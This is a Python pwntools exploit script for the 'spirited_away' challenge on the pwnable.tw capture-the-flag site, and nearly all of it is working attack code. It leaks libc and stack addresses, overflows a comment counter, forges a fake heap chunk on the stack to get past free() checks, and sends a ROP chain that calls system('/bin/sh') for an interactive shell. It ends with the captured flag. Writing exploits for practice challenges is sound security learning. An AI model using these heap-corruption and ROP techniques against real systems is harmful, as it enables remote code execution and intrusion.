#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndal(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
def _rcvl():
  return io.recvline()
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('spirited_away')

if args.HEAP_DEBUG:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    loader = '/lib/ld-linux.so.2'
else:
    libc = ELF('./libc_32.so.6')
    loader = './ld-2.23.so'
env = {'LD_PRELOAD': libc.path}

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10204)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        io = process([loader, exe.path] + argv, env=env, *a, **kw)
        gdb.attach(io, gdbscript=gdbscript)
        return io
    else:
        return process([loader, exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *0x08048743
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def create(name, age, reason, comment):
    _snda(':', name)
    _sndal(':', age)
    _snda('?', reason)
    _snda(':', comment)

again_prompt = 'Would you like to leave another comment? <y/n>:'
def again():
    _sndal(again_prompt, 'y')

def done():
    _sndal(again_prompt, 'n')

# Stage 1 - leak the libc
log.info('Crafted payload for leaking libc')

# the stack layout is different even if i use the same loader and libc
if args.LOCAL:
    to_send = 20
    libc_offset = libc.symbols['puts'] + 347
else:
    to_send = 8
    libc_offset = 0x1b0d60

create('AAA', 1, 'a' * to_send, 'b')
_rcvu('Reason: ')
_rcvn(to_send)

data = unpack(_rcvn(4))
libc.address = data - libc_offset
log.success('Libc base {}'.format(hex(libc.address)))
again()

# Stage 2 - leak the stack
if args.LOCAL:
    to_send = 56
    reason_buf_offset = 0x70
else:
    to_send = 56
    reason_buf_offset = 0x70

create('BBB', 1, 'c' * to_send, 'd')
_rcvu('Reason: ')
_rcvn(to_send)

data = unpack(_rcvn(4))
reason_buf = data - reason_buf_offset
log.info('Some stack addr {}'.format(hex(data)))
log.info('char reason[80] could be at {}'.format(hex(reason_buf)))
log.info('Fake chunk at {}'.format(hex(reason_buf+8)))
again()

# Stack 2 - overflow "name_and_comment_size"
for i in range(99):
    log.info("Creating comment {}".format(i))
    create(123, 123, 123, 123)
    again()

# create a facke chunk on the stack
# free(): invalid pointer -> bypass by alignment of the chunk (% 0x10 == 0)
# chunk size 0x40 (including the header), PREV_IN_USE
# free(): invalid next size (fast) -> create another chunk next to it
create(123, 123, p32(0x0) + p32(0x40) + "A" * (0x40-8) + p32(0x40) + p32(0x21), "a"*84 + p32(reason_buf+8))
again()
log.success('Created the fake chunk')

rop = ROP(libc)
rop.system(next(libc.search("/bin/sh\x00")))
log.info(rop.dump())
rop = rop.chain()

# offset to eip  is 76
create("g" * 76 + rop, 99, "e", "f")
done()

log.success("Spawned shell")

io.interactive()

# FLAG{Wh4t_1s_y0ur_sp1r1t_1n_pWn}

